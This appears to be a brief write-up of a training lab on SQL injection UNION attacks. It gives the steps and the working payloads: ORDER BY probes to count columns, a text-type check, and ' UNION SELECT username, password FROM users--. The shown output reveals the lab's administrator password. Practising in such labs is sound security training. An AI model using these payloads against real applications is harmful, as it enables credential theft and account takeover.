Lab: SQL injection UNION attack, retrieving data from other tables

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 


Determine number of columns

' order by 1-- okay

' order by 3-- error so 3 - 1 = 2 columns

Determine if we can put text

' UNION SELECT 'a' , 'a'-- okay
both can take text

Lets take the users and password

The database contains a different table called users,
 with columns called username and password. 

' UNION SELECT username , password FROM users--

        <th>administrator</th>
        <td>z1bofkjiak59ovliqrls</td>
